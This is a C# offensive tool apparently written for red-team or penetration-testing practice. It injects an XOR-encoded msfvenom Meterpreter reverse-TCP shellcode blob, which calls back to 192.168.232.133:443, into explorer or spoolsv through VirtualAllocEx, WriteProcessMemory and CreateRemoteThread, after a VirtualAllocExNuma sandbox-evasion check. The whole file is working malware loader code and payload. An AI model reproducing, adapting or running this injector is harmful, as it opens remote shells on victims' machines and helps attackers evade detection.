using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace RemoteShinject
{
    public class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        public static void Main(string[] args)
        {
            // Sandbox evasion
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // Xor-encoded payload, key 0xfa
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[697] {
0x06, 0x12, 0x75, 0xfa, 0xfa, 0xfa, 0x9a, 0x73, 0x1f, 0xcb, 0x28, 0x9e, 0x71, 0xa8, 0xca, 
0x71, 0xa8, 0xf6, 0x71, 0xa8, 0xee, 0xcb, 0x05, 0xf5, 0x4d, 0xb0, 0xdc, 0x71, 0x88, 0xd2, 
0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0x3b, 0x35, 0xf7, 0xfb, 0x3d, 0xb3, 
0x8f, 0x15, 0xa8, 0xad, 0x71, 0xa8, 0xea, 0x71, 0xb8, 0xc6, 0xfb, 0x2a, 0x71, 0xba, 0x82, 
0x7f, 0x3a, 0x8e, 0xb6, 0xfb, 0x2a, 0xaa, 0x71, 0xb2, 0xe2, 0x71, 0xa2, 0xda, 0xfb, 0x29, 
0x7f, 0x33, 0x8e, 0xc6, 0xb3, 0xcb, 0x05, 0x71, 0xce, 0x71, 0xfb, 0x2c, 0xcb, 0x3a, 0x3b, 
0x35, 0xf7, 0x56, 0xfb, 0x3d, 0xc2, 0x1a, 0x8f, 0x0e, 0xf9, 0x87, 0x02, 0xc1, 0x87, 0xde, 
0x8f, 0x1a, 0xa2, 0x71, 0xa2, 0xde, 0xfb, 0x29, 0x9c, 0x71, 0xf6, 0xb1, 0x71, 0xa2, 0xe6, 
0xfb, 0x29, 0x71, 0xfe, 0x71, 0xfb, 0x2a, 0x73, 0xbe, 0xde, 0xde, 0xa1, 0xa1, 0x9b, 0xa3, 
0xa0, 0xab, 0x05, 0x1a, 0xa2, 0xa5, 0xa0, 0x71, 0xe8, 0x13, 0x7a, 0x05, 0x05, 0x05, 0xa7, 
0x92, 0x94, 0x9f, 0x8e, 0xfa, 0x92, 0x8d, 0x93, 0x94, 0x93, 0xae, 0x92, 0xb6, 0x8d, 0xdc, 
0xfd, 0x05, 0x2f, 0xcb, 0x21, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0x12, 0x89, 0xfa, 0xfa, 0xfa, 
0xb7, 0x95, 0x80, 0x93, 0x96, 0x96, 0x9b, 0xd5, 0xcf, 0xd4, 0xca, 0xda, 0xd2, 0xb7, 0x9b, 
0x99, 0x93, 0x94, 0x8e, 0x95, 0x89, 0x92, 0xc1, 0xda, 0xb3, 0x94, 0x8e, 0x9f, 0x96, 0xda, 
0xb7, 0x9b, 0x99, 0xda, 0xb5, 0xa9, 0xda, 0xa2, 0xda, 0xcb, 0xce, 0xa5, 0xca, 0xd3, 0xda, 
0xbb, 0x8a, 0x8a, 0x96, 0x9f, 0xad, 0x9f, 0x98, 0xb1, 0x93, 0x8e, 0xd5, 0xcf, 0xc9, 0xcd, 
0xd4, 0xc9, 0xcc, 0xda, 0xd2, 0xb1, 0xb2, 0xae, 0xb7, 0xb6, 0xd6, 0xda, 0x96, 0x93, 0x91, 
0x9f, 0xda, 0xbd, 0x9f, 0x99, 0x91, 0x95, 0xd3, 0xda, 0xb9, 0x92, 0x88, 0x95, 0x97, 0x9f, 
0xd5, 0xcb, 0xcb, 0xcd, 0xd4, 0xca, 0xd4, 0xca, 0xd4, 0xca, 0xda, 0xa9, 0x9b, 0x9c, 0x9b, 
0x88, 0x93, 0xd5, 0xcf, 0xc9, 0xcd, 0xd4, 0xc9, 0xcc, 0xfa, 0x92, 0xc0, 0xac, 0x83, 0x5d, 
0x05, 0x2f, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xa9, 0x92, 0x41, 0xfb, 0xfa, 0xfa, 0x12, 0xa6, 
0xfb, 0xfa, 0xfa, 0xd5, 0xab, 0x95, 0xb8, 0x92, 0x97, 0x80, 0x99, 0xaf, 0x90, 0x90, 0x80, 
0x96, 0x90, 0x8f, 0xa9, 0xaa, 0x9d, 0xce, 0xbf, 0xb3, 0xc2, 0xab, 0x88, 0x9e, 0x8e, 0xbd, 
0xce, 0xa3, 0x8d, 0xc2, 0x9f, 0x8f, 0xa8, 0xa2, 0xab, 0x8a, 0xaf, 0xb4, 0xca, 0xb0, 0xb7, 
0xa3, 0xcf, 0x82, 0xad, 0x94, 0x99, 0x9c, 0xa8, 0xa2, 0x97, 0xbb, 0xb0, 0x91, 0xa8, 0xa8, 
0xc2, 0x9c, 0xcf, 0x93, 0xc9, 0x8f, 0xa3, 0xa8, 0x96, 0x9f, 0xb9, 0x9d, 0xce, 0xb9, 0x82, 
0x9f, 0xb9, 0xca, 0xb7, 0x90, 0xac, 0x9d, 0x9c, 0xb7, 0x93, 0xac, 0x93, 0x9d, 0x8f, 0x80, 
0xb6, 0x89, 0x83, 0x99, 0x8b, 0xad, 0x8a, 0x93, 0x8d, 0xaa, 0x8b, 0xb7, 0xb1, 0xc3, 0x80, 
0x93, 0xb7, 0xa3, 0xbd, 0x8a, 0xb8, 0xc2, 0x9d, 0x83, 0xc2, 0xb9, 0xa0, 0x80, 0x8b, 0xa9, 
0xb7, 0x90, 0xb5, 0x9f, 0xc8, 0x9d, 0x83, 0x8c, 0x88, 0xb7, 0x8e, 0xac, 0x90, 0x8d, 0x8c, 
0xcb, 0x98, 0x9c, 0x90, 0x94, 0xc9, 0xa0, 0x82, 0x80, 0x99, 0xca, 0xae, 0xa5, 0xc3, 0xcb, 
0xc9, 0x8b, 0xb7, 0xbd, 0x94, 0x96, 0xc3, 0x97, 0xad, 0x94, 0xc8, 0xce, 0x92, 0xb3, 0x8b, 
0xb3, 0x83, 0x90, 0x95, 0xc8, 0x9d, 0x96, 0x97, 0x91, 0xb4, 0x8e, 0xbe, 0xbe, 0xab, 0xbe, 
0xbe, 0x8b, 0xac, 0xaf, 0xcb, 0x92, 0xb1, 0xa8, 0x93, 0x9f, 0x8c, 0x9f, 0x9c, 0xa9, 0x9d, 
0xa9, 0x93, 0x96, 0xbb, 0xad, 0xbf, 0xb9, 0xcb, 0x83, 0xae, 0xcf, 0xc9, 0xfa, 0xaa, 0x92, 
0xad, 0x73, 0x65, 0x3c, 0x05, 0x2f, 0x73, 0x3c, 0xa9, 0x92, 0xfa, 0xc8, 0x12, 0x7e, 0xa9, 
0xa9, 0xa9, 0xad, 0xa9, 0xac, 0x92, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 0x6c, 0x90, 0xf0, 
0xa5, 0x92, 0x7a, 0xc9, 0xfa, 0xfa, 0x73, 0x1a, 0x90, 0xfe, 0xaa, 0x90, 0xe5, 0xac, 0x92, 
0x8f, 0xbc, 0x64, 0x7c, 0x05, 0x2f, 0xa9, 0xa9, 0xa9, 0xa9, 0xac, 0x92, 0xd7, 0xfc, 0xe2, 
0x81, 0x05, 0x2f, 0x7f, 0x3a, 0x8f, 0xee, 0x92, 0x72, 0xe9, 0xfa, 0xfa, 0x92, 0xbe, 0x0a, 
0xcf, 0x1a, 0x05, 0x2f, 0xb5, 0x8f, 0x37, 0x12, 0xb1, 0xfa, 0xfa, 0xfa, 0x90, 0xba, 0x92, 
0xfa, 0xea, 0xfa, 0xfa, 0x92, 0xfa, 0xfa, 0xba, 0xfa, 0xa9, 0x92, 0xa2, 0x5e, 0xa9, 0x1f, 
0x05, 0x2f, 0x69, 0xa9, 0xa9, 0x73, 0x1d, 0xad, 0x92, 0xfa, 0xda, 0xfa, 0xfa, 0xa9, 0xac, 
0x92, 0xe8, 0x6c, 0x73, 0x18, 0x05, 0x2f, 0x7f, 0x3a, 0x8e, 0x35, 0x71, 0xfd, 0xfb, 0x39, 
0x7f, 0x3a, 0x8f, 0x1f, 0xa2, 0x39, 0xa5, 0x12, 0x91, 0x05, 0x05, 0x05, 0xcb, 0xc3, 0xc8, 
0xd4, 0xcb, 0xcc, 0xc2, 0xd4, 0xce, 0xcf, 0xd4, 0xc8, 0xc9, 0xcb, 0xfa, 0x41, 0x0a, 0x4f, 
0x58, 0xac, 0x90, 0xfa, 0xa9, 0x05, 0x2f
};








































            int len = buf.Length;

            // Parse arguments, if given (process to inject)
            String procName = "";
            if (args.Length == 1)
            {
                procName = args[0];
            }
            else if (args.Length == 0) {
                // Inject based on elevation level
                if (IsElevated)
                {
                    Console.WriteLine("Process is elevated.");
                    procName = "spoolsv";
                } 
                else
                {
                    Console.WriteLine("Process is not elevated.");
                    procName = "explorer";
                }
            }
            else
            {
                Console.WriteLine("Please give either one argument for a process to inject, e.g. \".\\ShInject.exe explorer\", or leave empty for auto-injection.");
                return;
            }

            Console.WriteLine($"Attempting to inject into {procName} process...");

            // Get process IDs
            Process[] expProc = Process.GetProcessesByName(procName);

            // If multiple processes exist, try to inject in all of them
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // Get a handle on the process
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // Allocate memory in the remote process
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // Decode the payload
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0xfa);
                }

                // Write the payload to the allocated bytes
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                break;
            }
        }
    }
}







































